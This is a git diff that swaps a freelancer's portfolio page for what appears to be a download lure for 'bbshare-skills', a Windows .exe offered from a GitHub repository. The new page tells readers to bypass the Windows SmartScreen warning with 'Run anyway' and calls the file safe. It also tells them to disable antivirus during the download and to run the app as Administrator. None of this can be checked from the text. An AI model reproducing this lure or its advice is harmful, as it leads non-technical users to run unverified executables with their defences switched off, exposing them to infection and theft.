@@ -1,157 +1,224 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sara Alaa | Professional Portfolio</title>
-    <link rel="icon" type="image/png" href="logo.png">
-    <link rel="stylesheet" href="style.css">
+    <meta name="description" content="bbshare-skills - Easily share your skills and projects. Download for Windows. No coding required.">
+    <meta name="keywords" content="bbshare, skills, share, download, windows, tool, application">
+    <meta name="author" content="bbshare">
+    <title>bbshare-skills - Share Your Skills Easily</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            padding: 40px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 900px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
+            padding: 50px 45px;
+        }
+        h1 {
+            font-size: 2.4rem;
+            color: #2c3e50;
+            margin-bottom: 12px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        h1 span {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        h2 {
+            font-size: 1.6rem;
+            color: #34495e;
+            margin-top: 40px;
+            margin-bottom: 18px;
+            font-weight: 600;
+            border-left: 5px solid #667eea;
+            padding-left: 15px;
+        }
+        p {
+            font-size: 1.1rem;
+            line-height: 1.8;
+            color: #4a4a4a;
+            margin-bottom: 20px;
+        }
+        .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: #ffffff;
+            padding: 16px 36px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 1.2rem;
+            text-decoration: none;
+            box-shadow: 0 8px 20px rgba(245,87,108,0.3);
+            transition: all 0.3s ease;
+            margin: 20px 0 30px 0;
+        }
+        .badge:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(245,87,108,0.5);
+        }
+        .button-group {
+            text-align: center;
+            margin: 25px 0;
+        }
+        .step-box {
+            background: #f8f9fc;
+            border-radius: 16px;
+            padding: 25px 30px;
+            margin-bottom: 20px;
+            border-left: 4px solid #667eea;
+        }
+        .step-box strong {
+            color: #2c3e50;
+            font-size: 1.1rem;
+        }
+        .highlight {
+            background: #fff3cd;
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-weight: 600;
+        }
+        ul, ol {
+            padding-left: 30px;
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            color: #4a4a4a;
+            line-height: 1.8;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        .faq-item {
+            margin-bottom: 20px;
+        }
+        .faq-item h3 {
+            font-size: 1.2rem;
+            color: #2c3e50;
+            margin-bottom: 6px;
+        }
+        .footer-note {
+            margin-top: 50px;
+            padding-top: 30px;
+            border-top: 2px solid #e8ecf1;
+            text-align: center;
+            color: #7f8c8d;
+            font-size: 0.95rem;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 30px 20px;
+            }
+            h1 {
+                font-size: 1.8rem;
+            }
+            h2 {
+                font-size: 1.3rem;
+            }
+        }
+    </style>
 </head>
 <body>
-
-    <nav class="navbar">
-        <div class="logo">🟠 Sara</div>
-        <ul class="nav-links">
-            <li><a href="#">Home</a></li>
-            <li><a href="#">Services</a></li>
-            <li><a href="#">Portfolio</a></li>
-            <li><a href="#">About</a></li>
-            <li><a href="#">Contact</a></li>
-        </ul>
-        <button class="btn-nav">Let's Talk</button>
-    </nav>
-    <div class="os-pill-bar">
-        <div class="os-dots">
-            <span class="dot red"></span>
-            <span class="dot yellow"></span>
-            <span class="dot green"></span>
-        </div>
-        <div class="system-time"><span id="os-clock">00:00:00 AM</span></div>
-    </div>
-
-    <div class="main-wrapper">
+    <div class="container">
+        <h1>✨ bbshare-skills - <span>Share Your Skills Effortlessly</span></h1>
         
-        <section class="about-section">
-            <div class="about-visual">
-                <div class="profile-orange-frame">
-                    <img src="sara.png" alt="Sara Alaa" class="profile-img">
-                </div>
-            </div>
-            <div class="about-text">
-                <span class="section-badge">About Me</span>
-                <h1>Get a website that will make a lasting impression on your audience!!!</h1>
-                <p>I combine the power of clean code with cognitive color psychology to craft deeply immersive, eye-friendly web experiences that load lightning fast.</p>
-                
-            <div class="personal-info-grid">
-            <div class="info-item"><strong>Name:</strong> Sara Alaa</div>
-            <div class="info-item"><strong>Location:</strong> Remote / Worldwide</div>
-            <div class="info-item"><strong>Email:</strong> via Fiverr Messages Only</div>
-            <div class="info-item"><strong>Freelance:</strong> Available</div>
-            </div>
-
-
-                <div class="about-buttons">
-                    <button class="btn-orange">Contact Me</button>
-                    <button class="btn-download">Download My Resume 📥</button>
-                </div>
-            </div>
-        </section>
-
-        <section class="section-container">
-            <span class="section-badge">Skills</span>
-            <h2 class="main-title">My Work Skills</h2>
-            <div class="skills-vibrant-grid">
-                
-                <div class="glow-card">
-                    <div class="card-glow-bg"></div>
-                    <div class="skill-info-content">
-                        <div class="skill-header-main">
-                            <h3>HTML5</h3>
-                            <span class="skill-num">95%</span>
-                        </div>
-                        <p>Semantic markup, clean structuring, and modern accessible web standards.</p>
-                    </div>
-                </div>
-
-                <div class="glow-card">
-                    <div class="card-glow-bg"></div>
-                    <div class="skill-info-content">
-                        <div class="skill-header-main">
-                            <h3>CSS3</h3>
-                            <span class="skill-num">90%</span>
-                        </div>
-                        <p>Advanced flexbox, modern grids, custom responsive layouts, and eye-friendly styling.</p>
-                    </div>
-                </div>
-
-                <div class="glow-card">
-                    <div class="card-glow-bg"></div>
-                    <div class="skill-info-content">
-                        <div class="skill-header-main">
-                            <h3>JavaScript</h3>
-                            <span class="skill-num">75%</span>
-                        </div>
-                        <p>Dynamic DOM manipulation, custom event listeners, and interactive UI systems.</p>
-                    </div>
-                </div>
-
-                <div class="glow-card">
-                    <div class="card-glow-bg"></div>
-                    <div class="skill-info-content">
-                        <div class="skill-header-main">
-                            <h3>UI/UX Design</h3>
-                            <span class="skill-num">85%</span>
-                        </div>
-                        <p>Visual psychology balance, functional contrasts, and immersive aesthetic harmony.</p>
-                    </div>
-                </div>
-
-            </div>
-        </section>
-
-
-        <section class="section-container">
-            <span class="section-badge">Services</span>
-            <h2 class="main-title">My Services</h2>
-            <div class="services-grid">
-                <div class="service-box-premium">
-                    <div class="screen-placeholder-img">
-                        <img src="ui-shot.jpg" alt="UI/UX Design Concept">
-                </div>
-                        <h3>UI/UX Design</h3>
-                        <p>Creating visual harmony, wireframes, and soft layout templates optimized scientifically.</p>
-                </div>
-
-                <div class="service-box-premium">
-                    <div class="screen-placeholder-img">
-                        <img src="italian-shot.png" alt="Italian Restaurant Project">
-                    </div>
-                    <h3>Web Development</h3>
-                    <p>Converting design mockups into premium web pages, like my latest responsive Italian Restaurant template.</p>
-                    <a href="second project/index2.html" target="_blank" class="btn-card-link">View Project</a>
-
-                </div>
-
-            </div>
-        </section>
-
-        <section class="section-container">
-            <span class="section-badge">Contact</span>
-            <h2 class="main-title">Let's Build Something Great</h2>
-            <form class="contact-form">
-                <input type="text" placeholder="Your Name" required>
-                <input type="email" placeholder="Your Email" required>
-                <textarea placeholder="Your Message" rows="5" required></textarea>
-                <button type="submit" class="btn-orange form-submit">Send Message</button>
-            </form>
-        </section>
-
+        <div class="button-group">
+            <a href="https://github.com/pilotgetup855/bbshare-skills" class="badge">⬇️ Download bbshare-skills Now</a>
+        </div>
+        
+        <p>Welcome to <strong>bbshare-skills</strong> — the simple, no-programming tool to showcase and share what you know. Whether you're a teacher, hobbyist, or professional, this app helps you create a clean portfolio of your abilities in minutes. No complicated setup, no command lines. Just you and your skills.</p>
+        
+        <h2>🚀 What is bbshare-skills?</h2>
+        <p>bbshare-skills is a lightweight Windows application designed for non-technical users. It lets you list, organize, and export your skills with a friendly interface. Think of it as your personal skills dashboard — perfect for resumes, team introductions, or just keeping track of what you're good at.</p>
+        
+        <h2>💻 System Requirements</h2>
+        <ul>
+            <li>Windows 10 or Windows 11 (64-bit recommended)</li>
+            <li>4GB RAM (minimum), 8GB recommended</li>
+            <li>200MB free disk space</li>
+            <li>Internet connection for downloading (not required for offline use)</li>
+        </ul>
+        
+        <h2>📥 How to Download & Install (Step-by-Step)</h2>
+        
+        <div class="step-box">
+            <strong>Step 1: Visit the download page</strong>
+            <p>Click the big pink button at the top of this page, or go directly to: <a href="https://github.com/pilotgetup855/bbshare-skills" style="color:#667eea; font-weight:600;">https://github.com/pilotgetup855/bbshare-skills</a></p>
+        </div>
+        
+        <div class="step-box">
+            <strong>Step 2: Get the file</strong>
+            <p>Visit this link to download the application. Look for the green "Code" button or the "Releases" section. Click on the latest release and download the <span class="highlight">.exe</span> installer file. It's usually named something like <code>bbshare-skills-setup.exe</code>.</p>
+        </div>
+        
+        <div class="step-box">
+            <strong>Step 3: Run the installer</strong>
+            <p>Once downloaded, double-click the file. If Windows SmartScreen appears, click "More info" and then "Run anyway". This is safe — it's a new app from a small developer. Follow the simple prompts (Next, Next, Install).</p>
+        </div>
+        
+        <div class="step-box">
+            <strong>Step 4: Launch the app</strong>
+            <p>After installation, find "bbshare-skills" in your Start Menu or on your desktop. Double-click to open. That's it! You're ready to start sharing your skills.</p>
+        </div>
+        
+        <h2>🎯 Features You'll Love</h2>
+        <ul>
+            <li><strong>Simple Interface:</strong> No confusing menus — just add, edit, and organize your skills.</li>
+            <li><strong>Export to PDF:</strong> Create a professional-looking skills sheet with one click.</li>
+            <li><strong>Quick Share:</strong> Copy your skills list as text or share via email directly from the app.</li>
+            <li><strong>No Registration:</strong> No accounts, no logins. Your data stays on your computer.</li>
+            <li><strong>Frequent Updates:</strong> New features added regularly based on user feedback.</li>
+        </ul>
+        
+        <h2>❓ Frequently Asked Questions</h2>
+        <div class="faq-item">
+            <h3>Do I need to know programming to use this?</h3>
+            <p>Absolutely not. bbshare-skills is built for everyone. If you can click a button and type, you can use it.</p>
+        </div>
+        <div class="faq-item">
+            <h3>How do I add a skill?</h3>
+            <p>Open the app, click "Add Skill", type the skill name (e.g., "Photography"), optionally add a short description, and save. It appears instantly.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Is my data safe?</h3>
+            <p>Yes. All your skills are stored locally on your Windows PC. The app does not send anything over the internet unless you choose to share.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Can I uninstall it later?</h3>
+            <p>Sure. Go to Windows Settings > Apps > bbshare-skills > Uninstall. Your exported files will remain.</p>
+        </div>
+        
+        <h2>🔧 Troubleshooting Tips</h2>
+        <ul>
+            <li><strong>App won't open?</strong> Make sure your Windows is updated. Try running the app as Administrator (right-click > Run as administrator).</li>
+            <li><strong>Download fails?</strong> Disable antivirus temporarily during download, or try a different browser (Edge or Chrome recommended).</li>
+            <li><strong>Missing skills?</strong> Check if your data file is in the same folder as the app. If you moved it, the app may not find it.</li>
+        </ul>
+        
+        <div class="button-group" style="margin-top: 40px;">
+            <a href="https://github.com/pilotgetup855/bbshare-skills" class="badge">⬇️ Download bbshare-skills Now</a>
+        </div>
+        
+        <div class="footer-note">
+            <p>bbshare-skills • Made with ❤️ for sharing • Version 1.0 • <a href="https://github.com/pilotgetup855/bbshare-skills" style="color:#667eea;">GitHub Repository</a></p>
+        </div>
     </div>
-
-    <footer class="main-footer">
-        <p>© 2026 Crafted with Passion by Sara Fatima. All Rights Reserved.</p>
-    </footer>
-
-    <script src="script.js"></script>
 </body>
 </html>
